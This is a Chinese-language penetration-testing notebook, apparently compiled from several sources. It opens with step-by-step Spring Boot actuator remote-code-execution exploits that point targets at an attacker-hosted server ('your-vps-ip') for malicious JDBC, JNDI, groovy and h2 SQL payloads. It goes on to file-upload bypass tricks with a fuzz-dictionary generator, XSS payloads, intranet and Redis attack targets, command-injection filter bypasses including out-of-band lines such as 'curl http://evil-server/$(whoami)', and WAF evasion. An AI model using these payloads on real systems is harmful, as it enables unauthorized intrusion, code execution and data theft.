java -jar ysoserial.jar CommonsCollections3 calc > payload.ser
```

在脚本**同目录下**生成 `payload.ser` 反序列化 payload 文件，供脚本使用。

**步骤三：设置 spring.datasource.url 属性**

> ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！

mysql-connector-java 5.x 版本设置**属性值**为：

```
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

mysql-connector-java 8.x 版本设置**属性值**为：

```
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.url","value":"对应属性值"}
```

**步骤四：刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json
```

**步骤五：触发数据库查询**

尝试访问网站已知的数据库查询的接口，例如： `/product/list` ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发

**步骤六：恢复正常 jdbc url**

反序列化漏洞利用完成后，使用 **步骤三** 的方法恢复 **步骤一** 中记录的 `spring.datasource.url` 的原始 `value` 值

**漏洞原理：**

1. spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址
2. refresh 刷新后设置了一个新的 spring.datasource.url 属性值
3. 当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接
4. 然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据
5. 目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞

**漏洞分析：**

​ [New-Exploit-Technique-In-Java-Deserialization-Attack](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)

**漏洞环境：**

> 需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出

[repository/springboot-mysql-jdbc-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce)

正常访问：

```
http://127.0.0.1:9097/actuator/env
```

发送完 payload 后触发漏洞：

```
http://127.0.0.1:9097/product/list
```

#### 0x09：restart logging.config logback JNDI RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/restart` 接口重启应用
* 普通 JNDI 注入受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过
* ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
* ⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出
* ⚠️ JNDI 服务返回的 object 需要实现 `javax.naming.spi.ObjectFactory` 接口，否则会导致程序异常退出

**利用方法：**

**步骤一：托管 xml 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在根目录放置以 `xml` 结尾的 `example.xml` 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y" as="appName" />
</configuration>
```

**步骤二：托管恶意 ldap 服务及代码**

参考[文章](https://landgrey.me/blog/21/)，修改 [JNDIExploit](https://github.com/feihong-cs/JNDIExploit) 并启动（也可以使用其他方法）：

```
java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip
```

**步骤三：设置 logging.config 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

logging.config=http://your-vps-ip/example.xml
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"logging.config","value":"http://your-vps-ip/example.xml"}
```

**步骤四：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json
```

**漏洞原理：**

1. 目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址
2. restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容
3. 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
4. xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
5. 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞

**漏洞分析：**

​ [spring boot actuator rce via jolokia](https://xz.aliyun.com/t/4258)

​ https://landgrey.me/blog/21/

**漏洞环境：**

[repository/springboot-restart-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce)

正常访问：

```
http://127.0.0.1:9098/actuator/env
```

#### 0x0A：restart logging.config groovy RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/restart` 接口重启应用
* ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
* ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
* ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出

**利用方法：**

**步骤一：托管 groovy 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在根目录放置以 `groovy` 结尾的 `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：

```xml
Runtime.getRuntime().exec("open -a Calculator")
```

**步骤二：设置 logging.config 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

logging.config=http://your-vps-ip/example.groovy
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"logging.config","value":"http://your-vps-ip/example.groovy"}
```

**步骤三：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json
```

**漏洞原理：**

1. 目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址
2. restart 重启应用后，程序会请求设置的 URL 地址
3. `logback-classic` 组件的 `ch.qos.logback.classic.util.ContextInitializer.java` 代码文件逻辑中会判断 url 是否以 `groovy` 结尾
4. 如果 url 以 `groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞

**漏洞环境：**

[repository/springboot-restart-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce)

正常访问：

```
http://127.0.0.1:9098/actuator/env
```

#### 0x0B：restart spring.main.sources groovy RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/restart` 接口重启应用
* ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
* ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
* ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出

**利用方法：**

**步骤一：托管 groovy 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在根目录放置以 `groovy` 结尾的 `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：

```xml
Runtime.getRuntime().exec("open -a Calculator")
```

**步骤二：设置 spring.main.sources 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.main.sources=http://your-vps-ip/example.groovy
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.main.sources","value":"http://your-vps-ip/example.groovy"}
```

**步骤三：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json
```

**漏洞原理：**

1. 目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址
2. restart 重启应用后，程序会请求设置的 URL 地址
3. `spring-boot` 组件中的 `org.springframework.boot.BeanDefinitionLoader.java` 文件代码逻辑中会判断 url 是否以 `.groovy` 结尾
4. 如果 url 以 `.groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞

**漏洞环境：**

[repository/springboot-restart-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce)

正常访问：

```
http://127.0.0.1:9098/actuator/env
```

#### 0x0C：restart spring.datasource.data h2 database RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/restart` 接口重启应用
* 环境中需要存在 `h2database`、`spring-boot-starter-data-jpa` 相关依赖
* ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
* ⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出

**利用方法：**

**步骤一：托管 sql 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：

> ⚠️ 下面payload 中的 'T5' 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出

```xml
CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','open -a Calculator');
```

**步骤二：设置 spring.datasource.data 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.data=http://your-vps-ip/example.sql
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.data","value":"http://your-vps-ip/example.sql"}
```

**步骤三：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json
```

**漏洞原理：**

1. 目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址
2. restart 重启应用后，程序会请求设置的 URL 地址
3. `spring-boot-autoconfigure` 组件中的 `org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java` 文件代码逻辑中会使用 `runScripts` 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞

**漏洞环境：**

[repository/springboot-restart-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce)

正常访问：

```
http://127.0.0.1:9098/actuator/env
```

***

**暴漏面利用点:**

文件读取

> *
>   *   用户目录下的敏感文件
>
>       .bash\_history.zsh\_history.profile.bashrc.gitconfig.viminfopasswd
> *
>   *   应用的配置文件
>
>       /etc/apache2/apache2.conf/etc/nginx/nginx.conf
> *
>   *   应用的日志文件
>
>       /var/log/apache2/access.log/var/log/nginx/access.log
> *
>   *   站点目录下的敏感文件
>
>       .svn/entries.git/HEADWEB-INF/web.xml .htaccess
> *
>   *   特殊的备份文件
>
>       .swp.swo.bakindex.php\~...
> *
>   *   Python的Cache
>
>       `__pycache__\__init__.cpython-35.pyc`

目录穿越

未授权

XSS

> onmousemove=prompt(1)
>
> onmousemove="prompt-#40;1)"

SQL

文件上传

> ### 4.8.1. 文件类型检测绕过
>
> #### 4.8.1.1. 更改请求绕过
>
> 有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了HTTP Header中的信息，比如 `Content-Type` 等，这种检查同样可以通过修改网络请求绕过。
>
> #### 4.8.1.2. Magic检测绕过
>
> 有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示

| 类型  | 二进制值                          |
| --- | ----------------------------- |
| JPG | FF D8 FF E0 00 10 4A 46 49 46 |
| GIF | 47 49 46 38 39 61             |
| PNG | 89 50 4E 47                   |
| TIF | 49 49 2A 00                   |
| BMP | 42 4D                         |

> #### 4.8.1.3. 后缀绕过
>
> 部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。
>
> asp/aspx 可解析asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr
>
> asp 支持`asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀。
>
> php由于历史原因，部分解释器可能支持符合正则 `/ph(p[2-7]?|t(ml)?)/` 的后缀，如 `php` / `php5` / `pht` / `phtml` / `shtml` / `pwml` / `phtm` 等 可在禁止上传php文件时测试该类型。
>
> jsp引擎则可能会解析 `jspx` / `jspf` / `jspa` / `jsw` / `jsv` / `jtml`/jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml 等后缀
>
> 除了这些绕过，其他的后缀同样可能带来问题，如 `vbs` / `asis` / `sh` / `reg` / `cgi` / `exe` / `dll` / `com` / `bat` / `pl` / `cfc` / `cfm` / `ini` 等。
>
> #### 4.8.1.4. 系统命名绕过
>
> 在Windows系统中，上传 `index.php.` 会重命名为 `.` ，可以绕过后缀检查。 也可尝试 `index.php%20` ， `index.php:1.jpg` `index.php::$DATA` 等。 在Linux系统中，可以尝试上传名为 `index.php/.` 或 `./aa/../index.php/.` 的文件
>
> #### 4.8.1.5. .user.ini
>
> 在php执行的过程中，除了主 `php.ini` 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$\_SERVER\['DOCUMENT\_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 `.user.ini` 中可以定义除了PHP\_INI\_SYSTEM以外的模式的选项，故可以使用 `.user.ini` 加上非php后缀的文件构造一个shell，比如 `auto_prepend_file=01.gif` 。
>
> #### 4.8.1.6. WAF绕过
>
> 有的waf在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。
>
> 另外，Waf和Web系统对 `boundary` 的处理不一致，可以使用错误的 `boundary` 来完成绕过。
>
> #### 4.8.1.7. 竞争上传绕过
>
> 有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。
>
> ### 4.8.2. 攻击技巧
>
> #### 4.8.2.1. Apache重写GetShell
>
> Apache可根据是否允许重定向考虑上传.htaccess
>
> 内容为
>
> ```
> AddType application/x-httpd-php .png
> php_flag engine 1
> ```
>
> 就可以用png或者其他后缀的文件做php脚本了
>
> #### 4.8.2.2. 软链接任意读文件
>
> 上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果
>
> ### 4.8.3. 防护技巧
>
> * 使用白名单限制上传文件的类型
> * 使用更严格的文件类型检查方式
> * 限制Web Server对上传文件夹的解析

文件上传FUZZ

> **利用点**
>
> 在动手之前我们来思考下上传漏洞跟那些因素有关：
>
> **1.可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等**
>
> **2.大小写混合，如果系统过滤不严，可能大小写可以绕过。**
>
> **3.中间件，每款中间件基本都解析漏洞,比如iis就可以把xxx.asp;.jpg当asp来执行。**
>
> **4.系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。**
>
> **5.语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。**
>
> **6.双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。**
>
> 整理以上思考，我们把生成字典的规则梳理为以下几条：
>
> > 可解析的后缀+大小写混合
> >
> > 可解析的后缀+大小写混合+中间件漏洞
> >
> > .htaccess + 大小写混合
> >
> > 可解析的后缀+大小写混合+系统特性
> >
> > 可解析的后缀+大小写混合+语言漏洞
> >
> > 可解析的后缀+大小写混合+双后缀
>
> 下面我们根据上面的构想，来分析每一方面的细节，并使用代码来实现。
>
> *   中间件
>
>     > #### 4.1 iis
>     >
>     > iis一共有三个解析漏洞：
>     >
>     > 1.IIS6.0文件解析 xx.asp;.jpg2.IIS6.0目录解析 xx.asp/1.jpg3.IIS 7.0畸形解析 xxx.jpg/x.asp
>     >
>     > 由于2和3和上传的文件名无关，故我们只根据1来生成fuzz字典
>     >
>     > ```python
>     > def iis_suffix_creater(suffix):
>     >  res = []
>     >  for l in suffix:
>     >      str ='%s;.%s' % (l,allow_suffix)
>     >      res.append(str)
>     >  return res
>     > ```
>     >
>     > apache相关的解析漏洞有两个：
>     >
>     > ```
>     > 1.%0a(CVE-2017-15715)2.未知后缀 test.php.xxx
>     > ```
>     >
>     > 根据以上构造`apache_suffix_builder`函数生成规则：
>     >
>     > ```
>     > def apache_suffix_creater(suffix):
>     >  res = []
>     >  for l in suffix:
>     >      str = '%s.xxx' % l
>     >      res.append(str)
>     >      str = '%s%s' % (l,urllib.unquote('%0a')) #CVE-2017-15715
>     >      res.append(str)
>     >  return res
>     > ```
>     >
>     > #### 4.3 nginx
>     >
>     > nginx解析漏洞有三个：
>     >
>     > > 访问连接加/xxx.php test.jpg/xxx.php
>     > >
>     > > 畸形解析漏洞 test.jpg%00xxx.php
>     > >
>     > > CVE-2013-4547 test.jpg(非编码空格)\0x.php
>     >
>     > #### 4.4 tomcat
>     >
>     > tomcat用于上传绕过的有三种,不过限制在windows操作系统下。
>     >
>     > ```
>     > xxx.jsp/xxx.jsp%20xxx.jsp::$DATA
>     > ```
>     >
>     > 根据以上规则生成字典对应的代码为：
>     >
>     > ```
>     > win_tomcat = ['%20','::$DATA','/']
>     > def tomcat_suffix_creater(suffix):
>     >     res = []
>     >     for l in suffix:
>     >         for t in win_tomcat:
>     >             str = '%s%s' % (l,t)
>     >             res.append(str)
>     >     return res
>     > ```
>     >
>     > 如果确定中间件为apache,可以加入.htaccess。同时如果操作系统还为windows，我们可以大小写混合。
>     >
>     > ```
>     > if (middleware == 'apache' or middleware == 'all') and (os == 'win' or os == 'all'):
>     >     htaccess_suffix = uperTest(".htaccess")
>     > elif (middleware == 'apache' or middleware == 'all') and os == 'linux':
>     >     htaccess_suffix = ['.htaccess']
>     > else:
>     >     htaccess_suffix = []
>     > ```
>     >
>     > #### 4.5 语言，中间件与操作系统的关系
>     >
>     > 以上我们根据每个中间件的漏洞，编写了对应的fuzz字典生成函数。在最终生成字典时，我们还要考虑中间件可以运行那些语言，以及它们与平台的关系。
>
>     |    语言    | IIS | Apache | Tomcat | Window | Linux |
>     | :------: | :-: | :----: | :----: | :----: | :---: |
>     | asp/aspx |  √  |    √   |    ×   |    √   |   √   |
>     |    php   |  √  |    √   |    √   |    √   |   √   |
>     |    jsp   |  √  |    ×   |    √   |    √   |   √   |
>
>     > 根据上表，我们明白：
>     >
>     > iis下可以运行asp/aspx,php,jsp脚本，故这3种脚本语言可解析后缀均应该传入iis\_suffix\_builder()进行处理；
>     >
>     > apache下可以运行asp/aspx,php。故这2两种脚本语言可解析后缀均应该传入apache\_suffix\_builder()进行处理；
>     >
>     > tomcat下可以运行php，jsp，故这两个脚本语言可解析后缀均应该传入tomcat\_suffix\_builder()进行处理。
>     >
>     > 注意：根据对tomcat上传的绕过分析，发现之后在windows平台下才能成功。故之后在Windows平台下才会调用`tomcat_suffix_builder()`对可解析后缀进行处理。
>     >
>     > 故伪代码可以编写如下：
>     >
>     > ```
>     > if middleware == 'iis':
>     >     case_asp_php_jsp_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_jsp_parse_suffix
>     >     middleware_parse_suffix = iis_suffix_creater(case_asp_php_jsp_parse_suffix)
>     > elif middleware == 'apache':
>     >     case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix
>     >     middleware_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)
>     > elif middleware == 'tomcat' and os == 'linux':
>     >     middleware_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix
>     > elif middleware == 'tomcat' and (os == 'win' or os == 'all'):
>     >     case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix
>     >     middleware_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)
>     > else:
>     >     case_asp_php_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix
>     >     iis_parse_suffix = iis_suffix_creater(case_asp_php_parse_suffix)
>     >     case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix
>     >     apache_parse_suffix = apache_build(case_asp_php_html_parse_suffix)
>     >     case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix
>     >     tomcat_parse_suffix = tomcat_build(case_php_jsp_parse_suffix)        
>     >     middleware_parse_suffix = iis_parse_suffix + apache_parse_suffix + tomcat_parse_suffix
>     > ```
>     >
>     > ### 五、系统特性
>     >
>     > 经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。
>     >
>     > Windows下文件名不区分大小写，Linux下文件名区分大写欧西；
>     >
>     > Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php；
>     >
>     > Windows下文件名结尾加入`.`,`空格`,`<`,·`>`,`>>>`,`0x81-0xff`等字符，最终生成的文件均被windows忽略。
>     >
>     > ```
>     > # 生成0x81-0xff的字符list
>     > def str_81_to_ff():
>     >     res = []
>     >     for i in range(129,256):
>     >         str = '%x' % i
>     >         str = '%' + str
>     >         str = urllib.unquote(str)
>     >         res.append(str)
>     >     return res
>     > windows_os = [' ','.','/','::$DATA','<','>','>>>','%20','%00'] + str_81_to_ff()
>     > def windows_suffix_builder(suffix):
>     >     res = []
>     >     for s in suffix:
>     >         for w in windows_os:
>     >             str = '%s%s' % (s,w)
>     >             res.append(str)
>     >     return res
>     > ```
>     >
>     > ### 六、语言的漏洞
>     >
>     > 语言漏洞被利用于上传的有%00截断和0x00截断。它们在asp，php和jsp中都存在着。
>     >
>     > ```
>     > def str_00_truncation(suffix,allow_suffix):
>     >     res = []
>     >     for i in suffix:
>     >         str = '%s%s.%s' % (i,'%00',allow_suffix)
>     >         res.append(str)
>     >         str = '%s%s.%s' % (i,urllib.unquote('%00'),allow_suffix)
>     >         res.append(str)
>     >     return res
>     > ```
>     >
>     > ### 七、双后缀
>     >
>     > 有些站点通过对上传文件名进行删除敏感字符（php,asp,jsp等等）的方式进行过滤,例如你上传一个aphp.jpg的文件，那么上传之后就变成了a.jpg。这时就可以利用双后缀的方式上传一个a.pphphp,最终正好生成a.php。其实双后缀与中间件和操作系统无关，而是和代码逻辑有关。
>     >
>     > 针对双后缀，我们可以写个`str_double_suffix_creater(suffix)`函数，传入后缀名suffix即可生成所有的双后缀可能。
>     >
>     > ```
>     > def str_double_suffix_creater(suffix):
>     >     res = []
>     >     for i in range(1,len(suffix)):
>     >         str = list(suffix)
>     >         str.insert(i,suffix)
>     >         res.append("".join(str))
>     >     return res
>     > ```
>     >
>     > 在`list_double_suffix_creater(suffix)`函数基础上，可以编写`list_double_suffix_creater(list_suffix)`来为一个list生成所有双后缀可能。
>     >
>     > ```
>     > def list_double_suffix_creater(list_suffix):
>     >     res = []
>     >     for l in list_suffix:
>     >         res += double_suffix_creater(l)
>     >     return duplicate_removal(res)
>     > ```
>     >
>     > 工具
>     >
>     > ```
>     > $ python upload-fuzz-dic-builder.py -h
>     > usage: upload-fuzz-dic-builder [-h] [-n] [-a] [-l] [-m] [--os] [-d] [-o]
>     >
>     > optional arguments:
>     >   -h, --help            show this help message and exit
>     >   -n , --upload-filename
>     >                         Upload file name
>     >   -a , --allow-suffix   Allowable upload suffix
>     >   -l , --language       Uploaded script language
>     >   -m , --middleware     Middleware used in Web System
>     >   --os                  Target operating system type
>     >   -d, --double-suffix   Is it possible to generate double suffix?
>     >   -o , --output         Output file
>     > ```
>     >
>     > 脚本可以之定义生成的上传文件名（-n），允许的上传的后缀（-a），后端语言（-l），中间件(-m),操作系统（--os），是否加入双后缀（-d）以及输出的字典文件名（-o）。我们可以根据场景来生成合适的字典，提供的信息越详细，脚本生成的字典越精确。
>     >
>     > 由于知道我们的后端语言为`php`,中间件为`apache`，操作系统为`Windows`。所以可以利用这些信息生成更精确的fuzz字典。
>     >
>     > ```
>     > $ python upload-fuzz-dic-builder.py -l php -m apache --os win
>     > [+] 收集17条可解析后缀完毕！
>     > [+] 加入145条可解析后缀大小写混合完毕！
>     > [+] 加入152条中间件漏洞完毕！
>     > [+] 加入37条.htaccess完毕！
>     > [+] 加入10336条系统特性完毕！
>     > [+] 去重后共10753条数据写入upload_fuzz_dic.txt文件
>     > ```
>     >
>     > #### 抓包使用burp的Intruder模块对上传名称进行fuzz <在HTTP协议层面绕过WAF>

SSH

FTP

越权

会话

http

***

SQLMap

MSF

***

**内网利用点:**

* Apache Hadoop远程命令执行
* axis2-admin部署Server命令执行
* Confluence SSRF
* counchdb WEB API远程命令执行
* dict
* docker API远程命令执行
* Elasticsearch引擎Groovy脚本命令执行
* ftp / ftps（FTP爆破）
* glassfish任意文件读取和war文件部署间接命令执行
* gopher
* HFS远程命令执行
* http、https
* imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
* Java调试接口命令执行
* JBOSS远程Invoker war命令执行
* Jenkins Scripts接口命令执行
* ldap
* mongodb
* php\_fpm/fastcgi 命令执行
* rtsp - smb/smbs（连接SMB）
* sftp
* ShellShock 命令执行
* Struts2 命令执行
* telnet
* tftp（UDP协议扩展）
* tomcat命令执行
* WebDav PUT上传任意文件
* WebSphere Admin可部署war间接命令执行
* zentoPMS远程命令执行

#### 4.4.5.2. Redis利用

* 写ssh公钥
* 写crontab
* 写WebShell
* Windows写启动项
* 主从复制加载 .so 文件
* 主从复制写无损文件

## 4.5. 命令注入

### 4.5.1. 简介

命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。

该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

### 4.5.2. 常见危险函数

#### 4.5.2.1. PHP

* system
* exec
* passthru
* shell\_exec
* popen
* proc\_open

#### 4.5.2.2. Python

* system
* popen
* subprocess.call
* spawn

#### 4.5.2.3. Java

* java.lang.Runtime.getRuntime().exec(command)

### 4.5.3. 常见注入方式

* 分号分割
* `||` `&&` `&` 分割
* `|` 管道符
* `\r` `%d0%a0` 换行
* 反引号解析
* `$()` 替换

### 4.5.4. 无回显技巧

* bash反弹shell
* DNS带外数据
*
  *   http带外

      `curl http://evil-server/$(whoami)``wget http://evil-server/$(whoami)`
* 无带外时利用 `sleep` 或其他逻辑构造布尔条件

### 4.5.5. 常见绕过方式

#### 4.5.5.1. 空格绕过

* `<` 符号 `cat<123`
* &#x20;/ `%09`
* `${IFS}` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

#### 4.5.5.2. 黑名单绕过

* `a=l;b=s;$a$b`
* base64 `echo "bHM=" | base64 -d`
* `/?in/?s` => `/bin/ls`
* 连接符 `cat /etc/pass'w'd`
* 未定义的初始化变量 `cat$x /etc/passwd`

#### 4.5.5.3. 长度限制绕过

```
>wget\
>foo.\
>com
ls -t>a
sh a
```

上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,\[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell\_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件

### 4.5.6. 常用符号

#### 4.5.6.1. 命令分隔符

* `%0a` / `%0d` /  /&#x20;
* `;`
* `&` / `&&`

#### 4.5.6.2. 通配符

* `*` 0到无穷个任意字符
* `?` 一个任意字符 "\[ ]" 一个在括号内的字符，e.g. `[abcd]` "\[ - ]" 在编码顺序内的所有字符 "\[^ ]" 一个不在括号内的字符

### 4.5.7. 防御

* 不使用时禁用相应函数
* 尽量不要执行外部的应用程序或命令
* 做输入的格式检查
*
  *   转义命令中的所有shell元字符

      shell元字符包括 `#&;`,|\*?\~<>^()\[]{}$\`

***

## 利用分块传输吊打所有WAF

### 技巧1 使用注释扰乱分块数据包

一些如Imperva、360等比较好的WAF已经对Transfer-Encoding的分块传输做了处理，可以把分块组合成完整的HTTP数据包，这时直接使用常规的分块传输方法尝试绕过的话，会被WAF直接识别并阻断。

我们可以在\[[RFC7230\]](https://tools.ietf.org/html/rfc7230)中查看到有关分块传输的定义规范。

```
4.1.  Chunked Transfer Coding

   The chunked transfer coding wraps the payload body in order to
   transfer it as a series of chunks, each with its own size indicator,
   followed by an OPTIONAL trailer containing header fields.  Chunked
   enables content streams of unknown size to be transferred as a
   sequence of length-delimited buffers, which enables the sender to
   retain connection persistence and the recipient to know when it has
   received the entire message.

     chunked-body   = *chunk
                      last-chunk
                      trailer-part
                      CRLF

     chunk          = chunk-size [ chunk-ext ] CRLF
                      chunk-data CRLF
